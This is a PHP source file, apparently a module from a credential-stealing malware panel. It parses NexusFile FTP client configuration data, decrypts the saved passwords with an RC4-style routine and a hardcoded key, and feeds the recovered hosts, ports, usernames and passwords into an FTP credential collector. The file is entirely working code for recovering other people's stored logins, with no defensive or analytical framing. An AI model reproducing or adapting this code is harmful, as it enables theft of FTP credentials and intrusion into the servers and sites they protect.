<?php
class Module_nexusfile extends Module_
{
    private function decrypt($cipher_text, $key = 'xxx.xiles.net')
    {
        $cipher_text = utf8_encode(trim($cipher_text));
        if (!strlen($cipher_text) || !strlen($key))
            return '';

        $decoded_str = hex2bin($cipher_text);
        if ($decoded_str === false)
        {
            return '';
        }

        $cipher_text = '';
        for ($i = 0; $i < strlen($decoded_str); $i++)
        {
            $cipher_text .= chr(0).$decoded_str[$i];
        }

        $crypt_array = array();
        for ($i = 0; $i < 256; $i++)
        {
            array_push($crypt_array, $i);
        }

        $tmp_array = array();
        for ($i = 0; $i < 256; $i++)
        {
            array_push($tmp_array, ord($key[$i % strlen($key)]));
        }

        $v = 0;
        for ($i = 0; $i < 256; $i++)
        {
            $v = ($tmp_array[$i] + $crypt_array[$i] + $v) & 0xff;
            $t = $crypt_array[$i];
            $crypt_array[$i] = $crypt_array[$v];
            $crypt_array[$v] = $t;
        }

        $v11 = 0;
        $v12 = 0;
        $result = '';
        for ($i = 0; $i < strlen($cipher_text); $i+=2)
        {
            $v11 = ($v11 + 1) & 0xff;
            $v12 = ($crypt_array[$v11] + $v12) & 0xff;

            $t = $crypt_array[$v11];
            $crypt_array[$v11] = $crypt_array[$v12];
            $crypt_array[$v12] = $t;

            $cipher_wide_char = ((ord($cipher_text[$i]) << 8) | (ord($cipher_text[$i+1]))) ^
                                $crypt_array[($crypt_array[$v11]+$crypt_array[$v12]) & 0xff];

            $result .= chr($cipher_wide_char & 0xff).chr(($cipher_wide_char >> 8) & 0xff);
        }

        return unicode_to_ansi($result);
    }

    protected function ProcessNexus($Data)
    {
        $INI_ = parse_ini_string($Data, TRUE);
        if(!$INI_)
            return FALSE;

        foreach($INI_ as $Element)
        {
            $User = Assign_($Element['user']);
            $Pass = $this->decrypt($Element['pass']);
            $Host = Assign_($Element['host']);
            $Port = Assign_($Element['port']);
            $Prot = Assign_($Element['servertype']);

            $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == "SFTP") , $Port), $User, $Pass);
        }

        $INI_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessNexus(UnkTextToAnsi($Data));
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

